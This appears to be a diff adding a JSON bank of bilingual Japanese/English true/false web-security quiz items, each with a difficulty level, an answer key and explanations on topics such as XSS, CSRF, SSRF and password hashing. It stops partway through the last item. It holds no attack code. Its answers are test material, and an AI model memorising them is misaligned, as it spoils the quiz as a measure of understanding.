@@ -1,0 +1,1201 @@
+[{
+    "difficulty": 1,
+    "text": {
+      "ja": "HTTPではなくHTTPSを使用することで、通信内容が暗号化され、第三者による盗聴を防ぐことができる。",
+      "en": "Using HTTPS instead of HTTP encrypts the communication, preventing eavesdropping by third parties."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "HTTPSはSSL/TLSというプロトコルを用いて通信を暗号化するため、パスワードなどの機密情報を安全にやり取りできます。",
+      "en": "HTTPS uses the SSL/TLS protocol to encrypt communications, allowing sensitive data like passwords to be exchanged securely."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "パスワードはプレーンテキスト（平文）のままデータベースに保存するのが最も安全である。",
+      "en": "It is safest to store passwords in plain text in a database."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "データベースが漏洩した際にパスワードがそのまま流出してしまうため、必ずハッシュ化して保存する必要があります。",
+      "en": "If the database is leaked, plain text passwords will be exposed immediately. They must always be hashed before storing."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "SQLインジェクションは、悪意のあるSQL文を入力してデータベースを不正に操作する攻撃である。",
+      "en": "SQL injection is an attack in which malicious SQL statements are entered to manipulate the database illegally."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "ユーザーからの入力値をそのままSQL文の組み立てに使用すると、この脆弱性が発生する危険があります。",
+      "en": "This vulnerability occurs when user input is directly concatenated into SQL statements without proper sanitization."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "Webブラウザに鍵マークが表示されていれば、そのサイトは絶対に安全であり、詐欺サイトではない。",
+      "en": "If a padlock icon is displayed in the web browser, the site is absolutely safe and is not a scam site."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "鍵マークは通信が暗号化されていることを示しているだけであり、サイト運営者が悪意のある詐欺師ではないことを保証するものではありません。",
+      "en": "The padlock only indicates encrypted communication. It does not guarantee that the site operator is trustworthy or not a scammer."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "XSS（クロスサイトスクリプティング）は、悪意のあるスクリプトをユーザーのブラウザ上で実行させる攻撃である。",
+      "en": "XSS (Cross-Site Scripting) is an attack that executes malicious scripts on a user's browser."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "入力フォームや掲示板などを通じてスクリプトが埋め込まれ、セッションハイジャックなどの被害を引き起こします。",
+      "en": "Scripts are injected through input forms or message boards, often leading to session hijacking and other damages."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "セキュリティ対策ソフトをインストールしていれば、OSやWebブラウザのアップデートは不要である。",
+      "en": "If you have security software installed, you do not need to update your OS or web browser."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "ソフトウェアの脆弱性を修正するためには、OSやブラウザを常に最新バージョンにアップデートすることが不可欠です。",
+      "en": "Keeping your OS and browser updated to the latest versions is essential to patch software vulnerabilities."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "多要素認証（MFA）は、パスワードだけでなく、スマートフォンなどの別の要素を組み合わせて認証を強化する仕組みである。",
+      "en": "Multi-Factor Authentication (MFA) is a mechanism that strengthens authentication by combining passwords with other factors like a smartphone."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "知識情報（パスワード）と所持情報（スマホやトークン）を組み合わせることで、不正ログインのリスクを大幅に減らします。",
+      "en": "Combining knowledge (passwords) and possession (smartphones or tokens) greatly reduces the risk of unauthorized login."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "Webサイトの利用者は、パスワードを複数のサービスで使い回すことで、セキュリティを高めることができる。",
+      "en": "Users can enhance security by reusing the same password across multiple web services."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "使い回していると、1つのサービスからパスワードが漏洩した際に、他のサービスも連鎖的に不正アクセスされる危険があります。",
+      "en": "If you reuse passwords, a breach in one service can lead to a chain of unauthorized access across other services."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "フィッシングは、本物の企業などを装った偽のWebサイトに誘導し、個人情報を盗み出す攻撃である。",
+      "en": "Phishing is an attack that lures users to fake websites disguised as legitimate companies to steal personal information."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "偽のメールやSMSを送りつけ、金融機関などの偽サイトにIDやパスワードを入力させる手口が代表的です。",
+      "en": "A typical method is sending fake emails or SMS to trick victims into entering IDs and passwords on fraudulent banking sites."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "マルウェアは、特定のコンピュータのみを標的とするため、Webサイトを閲覧するだけで感染することはない。",
+      "en": "Malware only targets specific computers, so you cannot be infected simply by browsing a website."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "ドライブバイダウンロードと呼ばれる攻撃手法により、改ざんされたWebサイトを閲覧しただけでマルウェアに感染することがあります。",
+      "en": "Drive-by download attacks can infect your computer with malware simply by visiting a compromised website."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "WAF（Web Application Firewall）は、Webアプリケーションの脆弱性を突いた攻撃を検知し、防御するためのシステムである。",
+      "en": "A WAF (Web Application Firewall) is a system for detecting and defending against attacks that exploit web application vulnerabilities."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "SQLインジェクションやXSSなどの攻撃パターンをシグネチャベースなどで分析し、不正な通信を遮断します。",
+      "en": "It analyzes attack patterns like SQL injection and XSS using signatures and blocks malicious traffic."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "VPNを利用すれば、パスワードが単純であってもアカウントの乗っ取りを完全に防ぐことができる。",
+      "en": "Using a VPN can completely prevent account takeovers even if your password is weak."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "VPNは通信経路を暗号化するものであり、パスワード自体が弱ければ推測やリスト攻撃によってアカウントは乗っ取られます。",
+      "en": "A VPN encrypts the communication path. If the password itself is weak, the account can still be compromised by guessing or list attacks."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "セッションハイジャックは、ユーザーのセッションIDを盗み出し、本人になりすまして不正アクセスを行う攻撃である。",
+      "en": "Session hijacking is an attack that steals a user's session ID to impersonate them and gain unauthorized access."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "XSSや通信の盗聴などを通じてセッションIDが奪われると、パスワードを知らなくてもログイン状態を乗っ取られます。",
+      "en": "If a session ID is stolen via XSS or eavesdropping, the attacker can hijack the logged-in state without knowing the password."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "パスワードの文字数を少なくするほど、ブルートフォース攻撃（総当たり攻撃）に対して強くなる。",
+      "en": "The shorter the password, the stronger it becomes against brute-force attacks."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "文字数が少ないほど組み合わせのパターンが減るため、総当たり攻撃によって短時間で解読されてしまいます。",
+      "en": "Shorter passwords have fewer combinations, making them much faster and easier to crack using brute-force attacks."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "SSL/TLS証明書は、通信の暗号化だけでなく、Webサイトの運営者の身元を証明する役割も持つ。",
+      "en": "An SSL/TLS certificate provides not only communication encryption but also proves the identity of the website operator."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "信頼できる認証局（CA）が発行することで、アクセス先のサーバーが本物であることをクライアントに証明します。",
+      "en": "Issued by a trusted Certificate Authority (CA), it proves to the client that the destination server is authentic."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "コンピュータウイルスとランサムウェアは全く同じものである。",
+      "en": "Computer viruses and ransomware are exactly the same thing."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "ランサムウェアはマルウェアの一種ですが、データを暗号化して復号のために身代金を要求するという特定の特徴を持ちます。",
+      "en": "Ransomware is a specific type of malware characterized by encrypting data and demanding a ransom for decryption."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "ソーシャルエンジニアリングは、人間の心理的な隙を突いてパスワードなどの機密情報を盗み出す手法である。",
+      "en": "Social engineering is a technique that exploits human psychology to steal confidential information like passwords."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "電話で管理者を装ってパスワードを聞き出したり、肩越しにタイピングを覗き見る（ショルダーハッキング）などの手法が含まれます。",
+      "en": "It includes methods like pretending to be an administrator on the phone to ask for passwords, or shoulder surfing."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "Webセキュリティにおいて、クライアント側（ブラウザ側）での入力値チェックのみを行えば、サーバー側でのチェックは省略してよい。",
+      "en": "In web security, if input validation is performed on the client-side (browser), server-side validation can be safely omitted."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "クライアント側のチェックはツールを用いて簡単に回避できるため、必ずサーバー側でも厳密なバリデーションを行う必要があります。",
+      "en": "Client-side checks can be easily bypassed using tools. Strict validation on the server-side is always mandatory."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "脆弱性（セキュリティホール）とは、プログラムの不具合や設計上のミスにより発生するセキュリティ上の欠陥である。",
+      "en": "A vulnerability (security hole) is a security flaw caused by program bugs or design errors."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "攻撃者はこれらの脆弱性を悪用して、システムの乗っ取りやデータの改ざん・窃取を試みます。",
+      "en": "Attackers exploit these vulnerabilities to attempt system takeovers, data manipulation, or theft."
+    }
+  },
+  {
+    "difficulty": 1,
+    "text": {
+      "ja": "ネットワークのファイアウォールを設置すれば、SQLインジェクションなどのWebアプリケーションへの攻撃をすべて防ぐことができる。",
+      "en": "Installing a network firewall can prevent all attacks against web applications, such as SQL injection."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "一般的なファイアウォールはポートやIPレベルの制御を行うため、許可されたポート(80や443)を通るアプリケーション層の攻撃は防げません。",
+      "en": "Standard firewalls operate at the port or IP level, so they cannot block application-layer attacks passing through allowed ports like 80 or 443."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "パスワードのハッシュ化には、MD5やSHA-1ではなく、bcryptやArgon2などの安全なアルゴリズムを使用するべきである。",
+      "en": "For password hashing, secure algorithms like bcrypt or Argon2 should be used instead of MD5 or SHA-1."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "MD5やSHA-1は計算速度が速すぎたり衝突耐性が破られているため、パスワード保存用には設計された専用の関数を使う必要があります。",
+      "en": "MD5 and SHA-1 are too fast and have compromised collision resistance. Dedicated key derivation functions must be used for passwords."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "CSRF（クロスサイトリクエストフォージェリ）攻撃を防ぐためには、入力された文字列をエスケープ（サニタイズ）するだけで十分である。",
+      "en": "Escaping (sanitizing) input strings is sufficient to prevent CSRF (Cross-Site Request Forgery) attacks."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "CSRFはエスケープでは防げません。秘密のワンタイムトークン（CSRFトークン）を発行し、リクエストごとに検証するなどの対策が必要です。",
+      "en": "Escaping does not prevent CSRF. It requires countermeasures like issuing a secret one-time token (CSRF token) and validating it per request."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "HTTPヘッダの Strict-Transport-Security (HSTS) を設定すると、ブラウザに常にHTTPSで通信するように強制できる。",
+      "en": "Setting the Strict-Transport-Security (HSTS) HTTP header forces the browser to always communicate over HTTPS."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "これにより、ユーザーが誤ってHTTPでアクセスしようとしても、ブラウザが自動的にHTTPSに切り替えて通信を行います。",
+      "en": "This ensures that even if a user tries to access via HTTP, the browser will automatically upgrade the connection to HTTPS."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "セッションIDは、URLのクエリパラメータに含めて受け渡しを行うのが最も安全な方法である。",
+      "en": "Passing a session ID in the URL query parameters is the safest method."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "URLにセッションIDを含めると、ブラウザの履歴やRefererヘッダを通じて第三者に漏洩する危険性が高くなります。Cookieを使用すべきです。",
+      "en": "Putting session IDs in URLs increases the risk of leakage through browser history or Referer headers. Cookies should be used instead."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "X-Frame-Options ヘッダを DENY または SAMEORIGIN に設定することで、クリックジャッキング攻撃を軽減できる。",
+      "en": "Setting the X-Frame-Options header to DENY or SAMEORIGIN can mitigate clickjacking attacks."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "悪意のあるサイトがiframe内で自サイトを透明にして読み込み、ユーザーのクリックを誘導する攻撃を防ぎます。",
+      "en": "It prevents malicious sites from loading your site in an invisible iframe to trick users into clicking."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "CORS（Cross-Origin Resource Sharing）は、XSS攻撃を完全に防ぐために導入されたブラウザのセキュリティ機構である。",
+      "en": "CORS (Cross-Origin Resource Sharing) is a browser security mechanism introduced to completely prevent XSS attacks."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "CORSは、セキュリティの基本である同一生成元ポリシー（SOP）を「安全に緩和」して別ドメイン間のAPI通信を許可するための仕組みです。",
+      "en": "CORS is a mechanism designed to safely relax the Same-Origin Policy (SOP), allowing authorized cross-domain API communications."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "SQLインジェクションを防ぐための基本的な対策は、プレースホルダを用いたバインドメカニズム（プリペアドステートメント）を使用することである。",
+      "en": "The fundamental countermeasure against SQL injection is to use bind mechanisms with placeholders (prepared statements)."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "SQLの構文解析後にデータが割り当てられるため、入力値がSQLコマンドとして実行されることを確実に防げます。",
+      "en": "Because data is bound after the SQL statement is parsed, it guarantees that input values are treated strictly as data, not executable commands."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "サルト（Salt）は、ハッシュ化されたパスワードを元の平文に戻すために使用される秘密の鍵である。",
+      "en": "A salt is a secret key used to reverse hashed passwords back to plain text."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "ハッシュ化は不可逆であり元の平文には戻せません。サルトは、同じパスワードでも異なるハッシュ値にしてレインボーテーブル攻撃を防ぐためのランダムなデータです。",
+      "en": "Hashing is irreversible. A salt is random data added before hashing to ensure identical passwords have different hashes, preventing rainbow table attacks."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "クッキー（Cookie）に HttpOnly 属性を付与すると、JavaScriptの document.cookie からそのクッキーにアクセスできなくなる。",
+      "en": "Adding the HttpOnly attribute to a Cookie prevents it from being accessed via JavaScript's document.cookie."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "これにより、XSS脆弱性が存在した場合でもセッションIDなどの重要なクッキーが盗まれるリスクを大幅に下げることができます。",
+      "en": "This significantly reduces the risk of session IDs or critical cookies being stolen via an XSS vulnerability."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "クッキーの Secure 属性を true に設定すると、暗号化されていないHTTP通信でもクッキーが安全に送信されるようになる。",
+      "en": "Setting the Secure attribute to true ensures that the cookie is transmitted safely even over unencrypted HTTP connections."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "Secure属性は「HTTPS通信の時にのみクッキーを送信する」という指示であり、HTTP通信では送信自体が行われなくなります。",
+      "en": "The Secure attribute dictates that the cookie should only be sent over HTTPS connections, meaning it won't be sent over HTTP at all."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "ディレクトリトラバーサル（パストラバーサル）は、 ../ のような文字列を用いて、意図しないファイルやディレクトリにアクセスする攻撃である。",
+      "en": "Directory traversal (path traversal) is an attack that uses strings like ../ to access unintended files or directories."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "ファイルパスをパラメータで受け取る実装において、上位ディレクトリへの移動を許可してしまうとシステムのパスワードファイルなどが漏洩します。",
+      "en": "If moving to parent directories is allowed in file path parameters, sensitive system files like password files could be exposed."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "WAFを導入していれば、アプリケーション側でSQLインジェクション対策（プリペアドステートメントなど）を行う必要はない。",
+      "en": "If a WAF is implemented, there is no need to implement SQL injection countermeasures (like prepared statements) on the application side."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "WAFはあくまで多層防御の一部でありバイパスされる可能性もあるため、アプリケーションコード自体の根本的な対策は必須です。",
+      "en": "A WAF is just part of defense-in-depth and can potentially be bypassed. Fundamental fixes in the application code are always required."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "サプライチェーン攻撃は、ターゲット企業のセキュリティが強固な場合に、取引先や関連会社の脆弱性を経由して侵入する攻撃である。",
+      "en": "A supply chain attack targets vulnerabilities in a company's partners or affiliates when the primary target's security is too strong to breach directly."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "ソフトウェアのビルド環境や、セキュリティ対策が甘い子会社などを踏み台にして本丸を狙う手法です。",
+      "en": "Attackers use compromised software build environments or less secure subsidiaries as stepping stones to breach the main target."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "パスワードリスト攻撃を防ぐためには、パスワードの最低文字数を増やすだけで完全に防ぐことができる。",
+      "en": "Password list attacks can be completely prevented simply by increasing the minimum character length for passwords."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "パスワードリスト攻撃は他サイトから流出したIDとパスワードのセットを利用するため、文字数が多くても使い回していれば防げません。",
+      "en": "Since list attacks use credentials leaked from other sites, longer passwords offer no protection if users reuse them."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "Content-Security-Policy (CSP) ヘッダは、ブラウザが読み込むリソース（スクリプトや画像など）の制限を定義し、XSS攻撃の被害を軽減するのに役立つ。",
+      "en": "The Content-Security-Policy (CSP) header helps mitigate XSS attacks by defining restrictions on resources (scripts, images, etc.) the browser can load."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "許可していない外部ドメインからのスクリプト読み込みやインラインスクリプトの実行をブロックできます。",
+      "en": "It can block the loading of scripts from unauthorized external domains and the execution of inline scripts."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "Webアプリケーションでエラーが発生した際、データベースのスタックトレースや詳細なエラーメッセージを画面に表示することは、セキュリティを高める。",
+      "en": "Displaying database stack traces or detailed error messages on the screen when a web application encounters an error enhances security."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "詳細なエラー情報は攻撃者にとってシステムの内部構造を知る有用なヒントとなるため、ユーザーには汎用的なメッセージのみを表示すべきです。",
+      "en": "Detailed error information provides attackers with useful clues about the system's internal structure. Only generic messages should be displayed to users."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "ブルートフォース攻撃対策として、一定回数以上ログインに失敗したアカウントを一時的にロックする（アカウントロック）手法が有効である。",
+      "en": "As a countermeasure against brute-force attacks, temporarily locking an account after a certain number of failed login attempts is effective."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "攻撃者が総当たりでパスワードを試行することを物理的に困難にします。",
+      "en": "This physically prevents attackers from continuously attempting to guess the password through brute-force methods."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "オープンリダイレクト脆弱性は、攻撃者がサーバーのデータベースを直接書き換えることができる致命的な脆弱性である。",
+      "en": "An open redirect vulnerability is a critical flaw that allows an attacker to directly rewrite the server's database."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "オープンリダイレクトは、ユーザーを任意の悪意あるサイトへリダイレクト（転送）できる脆弱性であり、主にフィッシング詐欺に悪用されます。",
+      "en": "Open redirects allow attackers to redirect users to malicious sites, primarily abused for phishing, rather than directly rewriting databases."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "SameSite 属性を Lax または Strict に設定することで、CSRF攻撃のリスクを軽減することができる。",
+      "en": "Setting the SameSite attribute to Lax or Strict can mitigate the risk of CSRF attacks."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "別ドメインからのリクエスト送信時にCookie（セッション等）が送信されなくなるため、意図しない処理の実行を防ぎます。",
+      "en": "It prevents cookies (such as sessions) from being sent with cross-domain requests, thereby blocking unintended actions."
+    }
+  },
+  {
+    "difficulty": 2,
+    "text": {
+      "ja": "TLS 1.2よりもTLS 1.0のほうが新しいプロトコルであり、より強力な暗号化を提供する。",
+      "en": "TLS 1.0 is a newer protocol than TLS 1.2 and provides stronger encryption."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "数字が大きいほど新しく、TLS 1.0や1.1はすでに脆弱性が指摘されており、非推奨または無効化されています。",
+      "en": "Larger numbers mean newer versions. TLS 1.0 and 1.1 have known vulnerabilities and have been deprecated or disabled."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "JWT (JSON Web Token) の署名検証では、ヘッダの alg フィールドが none に設定されている場合に、署名をバイパスされる脆弱性が過去に存在した。",
+      "en": "In JWT (JSON Web Token) signature verification, there was a historical vulnerability where the signature could be bypassed if the alg field in the header was set to none."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "署名アルゴリズムを none として受け入れてしまう実装上の欠陥があり、攻撃者が任意のクレームを偽造できるリスクがありました。",
+      "en": "Flaws in some implementations accepted none as a valid signature algorithm, allowing attackers to forge arbitrary claims."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "CORSの設定において、Access-Control-Allow-Origin: * と Access-Control-Allow-Credentials: true を同時に設定することは安全であり標準的である。",
+      "en": "In CORS settings, configuring Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true is safe and standard."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "この組み合わせは非常に危険であり、ブラウザの仕様によってエラーとなります。認証情報を含む場合は特定のオリジンを明示する必要があります。",
+      "en": "This combination is highly dangerous and explicitly forbidden by browser specifications. When credentials are included, the exact origin must be specified."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "ブラインドSQLインジェクションは、データベースのエラーメッセージが表示されない場合でも、アプリケーションの応答時間やページの違いからデータを推測する攻撃である。",
+      "en": "Blind SQL injection is an attack that infers data from differences in application response times or page content, even when database error messages are not displayed."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "TRUE/FALSEの条件応答を利用するBoolean-basedや、SLEEP関数を利用したTime-basedの手法が存在します。",
+      "en": "Techniques include Boolean-based methods using TRUE/FALSE conditional responses, and Time-based methods using SLEEP functions."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "XSSには反射型、蓄積型、DOMベースの3種類があるが、DOMベースのXSSはサーバー側のWAFで100%検知・防御可能である。",
+      "en": "There are three types of XSS: reflected, stored, and DOM-based. DOM-based XSS can be 100% detected and prevented by a server-side WAF."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "DOMベースのXSSはURLフラグメント（#以降）などに仕込まれることが多く、サーバーにデータが送信されないためWAFでの検知は困難です。",
+      "en": "DOM-based XSS payloads are often hidden in URL fragments (after #) which are not sent to the server, making them very difficult for a WAF to detect."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "HTTPリクエストスマグリングは、フロントエンドのプロキシサーバーとバックエンドサーバー間でリクエストの境界（Content-Length と Transfer-Encoding）の解釈の違いを利用する攻撃である。",
+      "en": "HTTP Request Smuggling is an attack that exploits differences in how frontend proxies and backend servers interpret request boundaries (Content-Length and Transfer-Encoding)."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "この解釈のズレによって、攻撃者が他のユーザーのリクエストに悪意のあるリクエストを紛れ込ませ（密輸し）ます。",
+      "en": "This discrepancy allows an attacker to 'smuggle' a malicious request, attaching it to the next legitimate user's request."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "bcryptアルゴリズムは、計算コストを任意に変更できないため、将来のコンピュータの性能向上に対して脆弱である。",
+      "en": "Because the bcrypt algorithm cannot change its computational cost, it is vulnerable to future improvements in computer performance."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "bcryptにはワークファクター（コストパラメータ）が存在し、ハードウェアの進化に合わせて計算の重さを増やすことが可能です。",
+      "en": "bcrypt includes a work factor (cost parameter) that can be increased to make computations heavier as hardware performance improves."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "SSRF（サーバーサイドリクエストフォージェリ）は、攻撃者がWebサーバーを踏み台にして、内部ネットワークの別のサーバーやクラウドのメタデータAPIにアクセスする攻撃である。",
+      "en": "SSRF (Server-Side Request Forgery) is an attack where an attacker uses a web server as a proxy to access other servers on the internal network or cloud metadata APIs."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "クラウド環境(AWSの169.254.169.254など)では、この脆弱性を通じて強力なIAMクレデンシャルが盗まれる事例があります。",
+      "en": "In cloud environments (like AWS's 169.254.169.254), this vulnerability has led to the theft of powerful IAM credentials."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "キャッシュポイズニングは、データベースに悪意のあるキャッシュデータを直接書き込む攻撃である。",
+      "en": "Cache poisoning is an attack where malicious cache data is directly written into the database."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "Webキャッシュサーバー（CDNやVarnishなど）に対して不正なリクエストを送り、悪意のある応答をキャッシュさせて他ユーザーに配信させる攻撃です。",
+      "en": "It involves sending crafted requests to a web cache server (like CDN or Varnish) to cache malicious responses and serve them to other users."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "XXE（XML eXternal Entity）攻撃を防ぐためには、XMLパーサーの設定で外部エンティティの解決を無効化する必要がある。",
+      "en": "To prevent XXE (XML eXternal Entity) attacks, you must disable the resolution of external entities in the XML parser configuration."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "外部エンティティを許可していると、攻撃者がローカルファイルを読み取ったり、内部ネットワークをスキャンしたりすることが可能になります。",
+      "en": "If external entities are allowed, an attacker can read local files or scan the internal network."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "OAuth 2.0の認可コードフローにおいて、state パラメータはオプションであるため、セキュリティ上省略しても問題ない。",
+      "en": "In the OAuth 2.0 Authorization Code flow, the state parameter is optional, so it is perfectly fine to omit it for security purposes."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "stateパラメータは仕様上はオプションですが、CSRF攻撃（アカウント乗っ取りなど）を防ぐために実装上は必須と考えるべきです。",
+      "en": "Although technically optional in the spec, the state parameter is practically mandatory to prevent CSRF attacks, such as account hijacking."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "CSPの nonce (Number Used Once) は、インラインスクリプトの実行を許可するために、リクエストごとにランダムに生成される文字列である。",
+      "en": "The CSP nonce (Number Used Once) is a randomly generated string per request used to permit the execution of specific inline scripts."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "サーバーが生成したnonce属性を持つスクリプトタグのみが実行を許可されるため、攻撃者が注入したスクリプトはブロックされます。",
+      "en": "Only script tags with a matching nonce attribute generated by the server are allowed to execute, blocking attacker-injected scripts."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "Subresource Integrity (SRI) は、CDNから読み込むスクリプトのURLが変更されていないかを検証する仕組みである。",
+      "en": "Subresource Integrity (SRI) is a mechanism to verify that the URL of a script loaded from a CDN has not been altered."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "SRIはURLではなく、読み込んだファイルの内容（ハッシュ値）が改ざんされていないかをブラウザが検証する仕組みです。",
+      "en": "SRI verifies the contents (hash value) of the fetched file to ensure it hasn't been tampered with, not the URL itself."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "レインボーテーブル攻撃は、あらかじめ計算されたハッシュ値の膨大なリストを用いて、ハッシュ化されたパスワードを高速に逆算（クラック）する手法である。",
+      "en": "A rainbow table attack is a technique that uses a massive, precomputed list of hash values to rapidly crack hashed passwords."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "この攻撃への対策として、パスワードごとにランダムな文字列（サルト）を付加してからハッシュ化することが不可欠です。",
+      "en": "To counter this attack, it is essential to append a random string (salt) to each password before hashing."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "DNSリバインディングは、攻撃者が自身のDNSサーバーを用いて短時間でIPアドレスを変更し、同一生成元ポリシー(SOP)を回避してXSSを実行する攻撃である。",
+      "en": "DNS rebinding is an attack where an attacker changes IP addresses quickly using their DNS server to bypass the Same-Origin Policy (SOP) and execute XSS."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "SOPを回避する点は合っていますが、目的はXSSの実行ではなく、被害者のブラウザを踏み台にして内部ネットワーク（ルーターやIoT機器）にアクセスすることです。",
+      "en": "While it bypasses SOP, its purpose is not to execute XSS, but to use the victim's browser as a proxy to access internal network devices (routers, IoT)."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "Clickjacking対策として、現在は X-Frame-Options よりも CSP の frame-ancestors ディレクティブを使用することが推奨されている。",
+      "en": "As a defense against Clickjacking, using the CSP frame-ancestors directive is currently recommended over X-Frame-Options."
+    },
+    "answer": true,
+    "exp": {
+      "ja": "frame-ancestors の方がより柔軟に複数の親ドメインを許可できるなど、詳細な制御が可能です（ただし古いブラウザ対応のため併用されることが多いです）。",
+      "en": "frame-ancestors offers more flexible and granular control, such as allowing multiple specific parent domains (though both are often used for backward compatibility)."
+    }
+  },
+  {
+    "difficulty": 3,
+    "text": {
+      "ja": "Padding Oracle 攻撃は、RSA暗号などの公開鍵暗号方式におけるパディングの脆弱性を突く攻撃である。",
+      "en": "A Padding Oracle attack exploits padding vulnerabilities in public key cryptosystems like RSA."
+    },
+    "answer": false,
+    "exp": {
+      "ja": "Padding Oracle 攻撃は、CBCモードなどの「共通鍵暗号（ブロック暗号）」のパディングエラー応答を利用して暗号文を解読する手法です。",
